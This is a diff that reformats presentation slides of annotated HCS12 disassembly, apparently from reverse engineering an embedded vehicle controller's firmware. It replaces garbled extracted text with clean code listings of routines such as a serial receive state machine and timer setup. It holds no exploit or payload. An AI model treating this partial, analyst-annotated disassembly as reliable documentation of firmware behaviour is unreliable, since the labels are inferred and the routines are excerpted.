+EC80DE: 37            pshb; Push B
+EC80DF: 4AA336F3      call    mdfy_disablePIT_F3A336,#0xF3; Call subroutine in expanded memory
+EC80E3: E680          ldab    1+var_1,sp; Load B
+EC80E5: 37            pshb; Push B
+EC80E6: C602          ldab    #2; Load B
+EC80E8: 4ABB47EB      call    core_sci2_rx_SM_EBBB47,#0xEB; Call subroutine in expanded memory
+EC80EC: 1B82          leas    2,sp; Load effective address into SP
+EC80EE: 0A            rtc; Return from call
+```
 
-**sub_EC80F8** :
+#### **sub_EC80F8** :
 
-**EC80F8:** B796 **exg** b,y _; Exchange register to register_ **EC80FA:** 0CEA3C5220 **bset** 0x3C52,y,#0x20 _; ' '; Set bits in memory_ **EC80FF:** C603 **ldab** #3 _; Load B_ **EC8101:** 6BEA3AFF **stab** 0x3AFF,y _; Store B_ **EC8105:** 0A **rtc** _; Return from call_
+```
+EC80F8: B796          exg     b,y; Exchange register to register
+EC80FA: 0CEA3C5220    bset    0x3C52,y,#0x20 ; ' '; Set bits in memory
+EC80FF: C603          ldab    #3; Load B
+EC8101: 6BEA3AFF      stab    0x3AFF,y; Store B
+EC8105: 0A            rtc; Return from call
+```
 
-**sub_EC8106** :
+#### **sub_EC8106** :
 
-**EC8106:** C7 clrb _; Clear B_ **EC8107:** 4AA2F1F3 **call** mdfy_condcallEFBC09gone_ff_11_07_F3A2F1,#0xF3 _; Call subroutine in_ ↪ _expanded memory_ **EC810B:** C7 clrb _; Clear B_ **EC810C:** 4AA336F3 **call** mdfy_disablePIT_F3A336,#0xF3 _; Call subroutine in expanded memory_ **EC8110:** C7 clrb _; Clear B_ **EC8111:** 4A80F8EC **call** bset_20_bits_3C52_st_03_EC80F8,#0xEC _; Call subroutine in expanded_ ↪ _memory_ **EC8115:** 0A **rtc** _; Return from call_
+```
+EC8106: C7            clrb; Clear B
+EC8107: 4AA2F1F3      call    mdfy_condcallEFBC09gone_ff_11_07_F3A2F1,#0xF3; Call subroutine in
+↪   expanded memory
+EC810B: C7            clrb; Clear B
+EC810C: 4AA336F3      call    mdfy_disablePIT_F3A336,#0xF3; Call subroutine in expanded memory
+EC8110: C7            clrb; Clear B
+EC8111: 4A80F8EC      call    bset_20_bits_3C52_st_03_EC80F8,#0xEC; Call subroutine in expanded
+↪   memory
+EC8115: 0A            rtc; Return from call
+```
 
-**sub_EC8116** :
+#### **sub_EC8116** :
 
-|**EC8116:**|37|**pshb**_; _|_Push B_|
-|---|---|---|---|
-|**EC8117:**|37|**pshb**_; _|_Push B_|
-|**EC8118:**|B721|**tfr**|ccr,b_; Transfer register to register_|
-|**EC811A:**|6B80|**stab**|2+var_2,**sp**_; Store B_|
-|**EC811C:**|1410|**sei**_; _|_Set I bit_|
-|**EC811E:**|E681|**ldab**|2+var_1,**sp**_; Load B_|
-|**EC8120:**|87|clra_; _|_Clear A_|
-|**EC8121:**|B746|**tfr**|d,y_; Transfer register to register_|
-|**EC8123:**|1858|asly||
-|**EC8125:**|EDEA3AFD|**ldy**|0x3AFD,y_; Load Y_|
-|**EC8129:**|E642|**ldab**|2,y_; Load B_|
-|**EC812B:**|042132|**dbne**|b,loc_EC8160_; Decrement counter and branch if != 0_|
-
-75
+```
+EC8116: 37            pshb; Push B
+EC8117: 37            pshb; Push B
+EC8118: B721          tfr     ccr,b; Transfer register to register
+EC811A: 6B80          stab    2+var_2,sp; Store B
+EC811C: 1410          sei; Set I bit
+EC811E: E681          ldab    2+var_1,sp; Load B
+EC8120: 87            clra; Clear A
+EC8121: B746          tfr     d,y; Transfer register to register
+EC8123: 1858          asly
+EC8125: EDEA3AFD      ldy     0x3AFD,y; Load Y
+EC8129: E642          ldab    2,y; Load B
+EC812B: 042132        dbne    b,loc_EC8160; Decrement counter and branch if != 0
+```
 
 ## Slide 76
 
-**EC812E:** C602 **ldab** #2 _; Load B_ **EC8130:** 6B42 **stab** 2,y _; Store B_ **EC8132:** E681 **ldab** 2+var_1, **sp** _; Load B_ **EC8134:** B746 **tfr** d,y _; Transfer register to register_ **EC8136:** 59 **lsld** _; Logic shift left D_ **EC8137:** B745 **tfr** d,x _; Transfer register to register_ **EC8139:** EEE23AFD **ldx** 0x3AFD,x _; Load X_ **EC813D:** 180A00EA3C51 **movb** 0,x,0x3C51,y _; Move byte (8-bit)_ **EC8143:** 0DEA3C5209 **bclr** 0x3C52,y,#9 _; Clear bits in memory_ **EC8148:** 0CEA3C5204 **bset** 0x3C52,y,#4 _; Set bits in memory_ **EC814D:** E6EA3B00 **ldab** 0x3B00,y _; Load B_ **EC8151:** C102 **cmpb** #2 _; Compare B to memory_ **EC8153:** 260B **bne** loc_EC8160 _; Branch if not equal_ **EC8155:** E681 **ldab** 2+var_1, **sp** _; Load B_ **EC8157:** 37 **pshb** _; Push B_ **EC8158:** C602 **ldab** #2 _; Load B_ **EC815A:** 4ABB47EB **call** core_sci2_rx_SM_EBBB47,#0xEB _; Call subroutine in expanded memory_ **EC815E:** 1B81 **ins** _; Increment SP_ **EC8160:** E681 **ldab** 2+var_1, **sp** _; Load B_ **EC8162:** 87 clra _; Clear A_ **EC8163:** B746 **tfr** d,y _; Transfer register to register_ **EC8165:** 0FEA3C52203A **brclr** 0x3C52,y,#0x20,loc_EC81A5 _; ' '; Branch if selected bits clear_ **EC816B:** E7EA3AFF **tst** 0x3AFF,y _; Test memory for zero or minus_ **EC816F:** 2706 **beq** loc_EC8177 _; Branch if equal_ **EC8171:** 63EA3AFF **dec** 0x3AFF,y _; Decrement memory_ **EC8175:** 202E **bra** loc_EC81A5 _; Branch always_ **EC8177:** B746 **tfr** d,y _; Transfer register to register_ **EC8179:** 0DEA3C5220 **bclr** 0x3C52,y,#0x20 _; ' '; Clear bits in memory_ **EC817E:** 0FEA3C520406 **brclr** 0x3C52,y,#4,loc_EC818A _; Branch if selected bits clear_ **EC8184:** 4A8090EC **call**
+```
+EC812E: C602          ldab    #2; Load B
+EC8130: 6B42          stab    2,y; Store B
+EC8132: E681          ldab    2+var_1,sp; Load B
+EC8134: B746          tfr     d,y; Transfer register to register
+EC8136: 59            lsld; Logic shift left D
+EC8137: B745          tfr     d,x; Transfer register to register
+EC8139: EEE23AFD      ldx     0x3AFD,x; Load X
+EC813D: 180A00EA3C51  movb    0,x,0x3C51,y; Move byte (8-bit)
+EC8143: 0DEA3C5209    bclr    0x3C52,y,#9; Clear bits in memory
+EC8148: 0CEA3C5204    bset    0x3C52,y,#4; Set bits in memory
+EC814D: E6EA3B00      ldab    0x3B00,y; Load B
+EC8151: C102          cmpb    #2; Compare B to memory
+EC8153: 260B          bne     loc_EC8160; Branch if not equal
+EC8155: E681          ldab    2+var_1,sp; Load B
+EC8157: 37            pshb; Push B
+EC8158: C602          ldab    #2; Load B
+EC815A: 4ABB47EB      call    core_sci2_rx_SM_EBBB47,#0xEB; Call subroutine in expanded memory
+EC815E: 1B81          ins; Increment SP
+EC8160: E681          ldab    2+var_1,sp; Load B
+EC8162: 87            clra; Clear A
+EC8163: B746          tfr     d,y; Transfer register to register
+EC8165: 0FEA3C52203A  brclr   0x3C52,y,#0x20,loc_EC81A5 ; ' '; Branch if selected bits clear
+EC816B: E7EA3AFF      tst     0x3AFF,y; Test memory for zero or minus
+EC816F: 2706          beq     loc_EC8177; Branch if equal
+EC8171: 63EA3AFF      dec     0x3AFF,y; Decrement memory
+EC8175: 202E          bra     loc_EC81A5; Branch always
+EC8177: B746          tfr     d,y; Transfer register to register
+EC8179: 0DEA3C5220    bclr    0x3C52,y,#0x20 ; ' '; Clear bits in memory
+EC817E: 0FEA3C520406  brclr   0x3C52,y,#4,loc_EC818A; Branch if selected bits clear
+EC8184: 4A8090EC      call
+↪   core_chooseTimeout_clrset3C52_setupPIT_condcallEFBC09gone_ff_10_07sub_EC8090,#0xEC; Call
+↪   subroutine in expanded memory
+EC8188: 2013          bra     loc_EC819D; Branch always
+EC818A: B746          tfr     d,y; Transfer register to register
+EC818C: C601          ldab    #1; Load B
+EC818E: 6BEA3B00      stab    0x3B00,y; Store B
+EC8192: E681          ldab    2+var_1,sp; Load B
+EC8194: 37            pshb; Push B
+EC8195: C610          ldab    #0x10; Load B
+EC8197: 4A81B2EC      call    core_setPITTimeout_then_condcallEFBC09gone_ff_10_07_EC81B2,#0xEC;
+↪   Call subroutine in expanded memory
+EC819B: 1B81          ins; Increment SP
+EC819D: E681          ldab    2+var_1,sp; Load B
+EC819F: B796          exg     b,y; Exchange register to register
+EC81A1: 69EA3B01      clr     0x3B01,y; Clear memory
+EC81A5: 0E801002      brset   2+var_2,sp,#0x10,loc_EC81AB; Branch if selected bits set
+EC81A9: 10EF          cli; Clear I bit
+EC81AB: 31            puly; Pull Y
+EC81AC: 0A            rtc; Return from call
+```
 
-↪ core_chooseTimeout_clrset3C52_setupPIT_condcallEFBC09gone_ff_10_07sub_EC8090,#0xEC _; Call_ ↪ _subroutine in expanded memory_ **EC8188:** 2013 **bra** loc_EC819D _; Branch always_ **EC818A:** B746 **tfr** d,y _; Transfer register to register_ **EC818C:** C601 **ldab** #1 _; Load B_ **EC818E:** 6BEA3B00 **stab** 0x3B00,y _; Store B_ **EC8192:** E681 **ldab** 2+var_1, **sp** _; Load B_ **EC8194:** 37 **pshb** _; Push B_ **EC8195:** C610 **ldab** #0x10 _; Load B_ **EC8197:** 4A81B2EC **call** core_setPITTimeout_then_condcallEFBC09gone_ff_10_07_EC81B2,#0xEC _;_ ↪ _Call subroutine in expanded memory_ **EC819B:** 1B81 **ins** _; Increment SP_ **EC819D:** E681 **ldab** 2+var_1, **sp** _; Load B_ **EC819F:** B796 **exg** b,y _; Exchange register to register_ **EC81A1:** 69EA3B01 **clr** 0x3B01,y _; Clear memory_ **EC81A5:** 0E801002 **brset** 2+var_2, **sp** ,#0x10,loc_EC81AB _; Branch if selected bits set_ **EC81A9:** 10EF **cli** _; Clear I bit_ **EC81AB:** 31 **puly** _; Pull Y_ **EC81AC:** 0A **rtc** _; Return from call_
+#### **sub_ECA1BF** :
 
-**sub_ECA1BF** :
-
-**ECA1BF:** 37 **pshb** _; Push B_ **ECA1C0:** 3B **pshd** _; Push D_ **ECA1C1:** 4ABA95EB **call** Get_MID_88_EBBA95,#0xEB _; Call subroutine in expanded memory_ **ECA1C5:** 6B81 **stab** 3+var_2, **sp** _; Store B_ **ECA1C7:** E682 **ldab** 3+var_1, **sp** _; Load B_
-
-76
+```
+ECA1BF: 37            pshb; Push B
+ECA1C0: 3B            pshd; Push D
+ECA1C1: 4ABA95EB      call    Get_MID_88_EBBA95,#0xEB; Call subroutine in expanded memory
+ECA1C5: 6B81          stab    3+var_2,sp; Store B
+ECA1C7: E682          ldab    3+var_1,sp; Load B
+```
 
 ## Slide 77
 
-|**ECA1C9:**
-**ECA1CA:**|87
-B746|clra_; _
-**tfr**|_Clear A_
-d_;Transferreistertoreister_|
-|---|---|---|---|
-|
-**ECA1CC:**|
- 0FEA3D710108|**brclr**|,y  _g  g_
-0x3D71,y,#1,loc_ECA1DA_; Branch if selected bits clear_|
-|**ECA1D2:**|0FEA3D710202|**brclr**|0x3D71,y,#2,loc_ECA1DA_; Branch if selected bits clear_|
-|**ECA1D8:**|202C|**bra**|loc_ECA206_; Branch always_|
-|**ECA1DA:**|87|clra_; _|_Clear A_|
-|**ECA1DB:**|B746|**tfr**|d,y_; Transfer register to register_|
-|**ECA1DD:**|0FEA3D710111|**brclr**|0x3D71,y,#1,loc_ECA1F4_; Branch if selected bits clear_|
-|**ECA1E3:**|C609|**ldab**|#9_; Load B_|
-|**ECA1E5:**|7B3CB6|**stab**|byte_3CB6_; Store B_|
-|**ECA1E8:**|C601|**ldab**|#1_; Load B_|
-|**ECA1EA:**|7B3CB2|**stab**|byte3CB2_; Store B_|
-|**ECA1ED:**|0DEA3D7102|**bclr**|_
-0x3D71,y,#2_; Clear bits in memory_|
-|**ECA1F2:**|2017|**bra**|loc_ECA20B_; Branch always_|
-|**ECA1F4:**|B746|**tfr**|d,y_; Transfer register to register_|
-|**ECA1F6:**|0FEA3D71020A|**brclr**|0x3D71,y,#2,loc_ECA206_; Branch if selected bits clear_|
-|**ECA1FC:**|C601|**ldab**|#1_; Load B_|
-|**ECA1FE:**|7B3CB6|**stab**|byte_3CB6_; Store B_|
-|**ECA201:**|793CB2|**clr**|byte3CB2_; Clear memory_|
-|**ECA204:**|2005|**bra**|_
-loc_ECA20B_; Branch always_|
-|**ECA206:**|C603|**ldab**|#3_; Load B_|
-|**ECA208:**|7B122A|**stab**|byte_FD122A_; Store B_|
-|**ECA20B:**|F61230|**ldab**|byte_FD1230_; Load B_|
-|**ECA20E:**|C1A0|**cmpb**|#0xA0_; Compare B to memory_|
-|**ECA210:**|2308|**bls**|loc_ECA21A_; Branch if lower or same_|
-|**ECA212:**|C603|**ldab**|#3_; Load B_|
-|**ECA214:**|7B122A|**stab**|byte_FD122A_; Store B_|
-|**ECA217:**|7B3CB3|**stab**|byte_3CB3_; Store B_|
-|**ECA21A:**|F6122A|**ldab**|byte_FD122A_; Load B_|
-|**ECA21D:**|275D|**beq**|loc_ECA27C_; Branch if equal_|
-|**ECA21F:**|53|decb_; _|_Decrement B_|
-|**ECA220:**|18270184|**lbeq**|loc_ECA3A8_; Long branch if equal_|
-|**ECA224:**|04012F|**dbeq**|b,loc_ECA256_; Decrement counter and branch if = 0_|
-|**ECA227:**|53|decb_; _|_Decrement B_|
-|**ECA228:**|1827013C|**lbeq**|loc_ECA368_; Long branch if equal_|
-|**ECA22C:**|53|decb_; _|_Decrement B_|
-|**ECA22D:**|18260137|**lbne**|loc_ECA368_; Long branch if not equal_|
-|**ECA231:**|C602|**ldab**|#2_; Load B_|
-|**ECA233:**|7B3CB5|**stab**|byte_3CB5_; Store B_|
-|**ECA236:**|7B122A|**stab**|byte_FD122A_; Store B_|
-|**ECA239:**|793CB3|**clr**|byte_3CB3_; Clear memory_|
-|**ECA23C:**|793CB4|**clr**|byte3CB4_;Clearmemory_|
-|
-**ECA23F:**|
- CC0031|**ldd**|_
-#0x31 _; '1'; Load D_|
-|**ECA242:**|3B|**pshd**_; _|_Push D_|
-|**ECA243:**|C7|clrb_; _|_Clear B_|
-|**ECA244:**|3B|**pshd**_;_|_PushD_|
-|
-**ECA245:**|
- CC3D40|
-**ldd**|
-#0x3D40_; Load D_|
-|**ECA248:**|16E654|**jsr**|core_memset_E654_; Jump to subroutine_|
-|**ECA24B:**|1B84|**leas**|4,**sp**_; Load effective address into SP_|
-|**ECA24D:**|791230|**clr**|byteFD1230_; Clear memory_|
-|**ECA250:**|791227|**clr**|_
-byte_FD1227_; Clear memory_|
-|**ECA253:**|06A3A8|**jmp**|loc_ECA3A8_; Jump Address_|
-|**ECA256:**|CC122A|**ldd**|#0x122A_; Load D_|
-|**ECA259:**|3B|**pshd**_; _|_Push D_|
-|**ECA25A:**|CC3CB4|**ldd**|#0x3CB4_; Load D_|
-|**ECA25D:**|3B|**pshd**_; _|_Push D_|
-|**ECA25E:**|F63CB2|**ldab**|byte_3CB2_; Load B_|
-|**ECA261:**|4AB399E7|**call**|subE7B399#0xE7_;Callsubroutineinexpandedmemory_|
-|
-**ECA265:**|
- 1B84|**leas**|_,
-4,**sp**_; Load effective address into SP_|
-
-77
+```
+ECA1C9: 87            clra; Clear A
+ECA1CA: B746          tfr     d,y; Transfer register to register
+ECA1CC: 0FEA3D710108  brclr   0x3D71,y,#1,loc_ECA1DA; Branch if selected bits clear
+ECA1D2: 0FEA3D710202  brclr   0x3D71,y,#2,loc_ECA1DA; Branch if selected bits clear
+ECA1D8: 202C          bra     loc_ECA206; Branch always
+ECA1DA: 87            clra; Clear A
+ECA1DB: B746          tfr     d,y; Transfer register to register
+ECA1DD: 0FEA3D710111  brclr   0x3D71,y,#1,loc_ECA1F4; Branch if selected bits clear
+ECA1E3: C609          ldab    #9; Load B
+ECA1E5: 7B3CB6        stab    byte_3CB6; Store B
+ECA1E8: C601          ldab    #1; Load B
+ECA1EA: 7B3CB2        stab    byte_3CB2; Store B
+ECA1ED: 0DEA3D7102    bclr    0x3D71,y,#2; Clear bits in memory
+ECA1F2: 2017          bra     loc_ECA20B; Branch always
+ECA1F4: B746          tfr     d,y; Transfer register to register
+ECA1F6: 0FEA3D71020A  brclr   0x3D71,y,#2,loc_ECA206; Branch if selected bits clear
+ECA1FC: C601          ldab    #1; Load B
+ECA1FE: 7B3CB6        stab    byte_3CB6; Store B
+ECA201: 793CB2        clr     byte_3CB2; Clear memory
+ECA204: 2005          bra     loc_ECA20B; Branch always
+ECA206: C603          ldab    #3; Load B
+ECA208: 7B122A        stab    byte_FD122A; Store B
+ECA20B: F61230        ldab    byte_FD1230; Load B
+ECA20E: C1A0          cmpb    #0xA0; Compare B to memory
+ECA210: 2308          bls     loc_ECA21A; Branch if lower or same
+ECA212: C603          ldab    #3; Load B
+ECA214: 7B122A        stab    byte_FD122A; Store B
+ECA217: 7B3CB3        stab    byte_3CB3; Store B
+ECA21A: F6122A        ldab    byte_FD122A; Load B
+ECA21D: 275D          beq     loc_ECA27C; Branch if equal
+ECA21F: 53            decb; Decrement B
+ECA220: 18270184      lbeq    loc_ECA3A8; Long branch if equal
+ECA224: 04012F        dbeq    b,loc_ECA256; Decrement counter and branch if = 0
+ECA227: 53            decb; Decrement B
+ECA228: 1827013C      lbeq    loc_ECA368; Long branch if equal
+ECA22C: 53            decb; Decrement B
+ECA22D: 18260137      lbne    loc_ECA368; Long branch if not equal
+ECA231: C602          ldab    #2; Load B
+ECA233: 7B3CB5        stab    byte_3CB5; Store B
+ECA236: 7B122A        stab    byte_FD122A; Store B
+ECA239: 793CB3        clr     byte_3CB3; Clear memory
+ECA23C: 793CB4        clr     byte_3CB4; Clear memory
+ECA23F: CC0031        ldd     #0x31 ; '1'; Load D
+ECA242: 3B            pshd; Push D
+ECA243: C7            clrb; Clear B
+ECA244: 3B            pshd; Push D
+ECA245: CC3D40        ldd     #0x3D40; Load D
+ECA248: 16E654        jsr     core_memset_E654; Jump to subroutine
+ECA24B: 1B84          leas    4,sp; Load effective address into SP
+ECA24D: 791230        clr     byte_FD1230; Clear memory
+ECA250: 791227        clr     byte_FD1227; Clear memory
+ECA253: 06A3A8        jmp     loc_ECA3A8; Jump Address
+ECA256: CC122A        ldd     #0x122A; Load D
+ECA259: 3B            pshd; Push D
+ECA25A: CC3CB4        ldd     #0x3CB4; Load D
+ECA25D: 3B            pshd; Push D
+ECA25E: F63CB2        ldab    byte_3CB2; Load B
+ECA261: 4AB399E7      call    sub_E7B399,#0xE7; Call subroutine in expanded memory
+ECA265: 1B84          leas    4,sp; Load effective address into SP
+```
 
 ## Slide 78
 
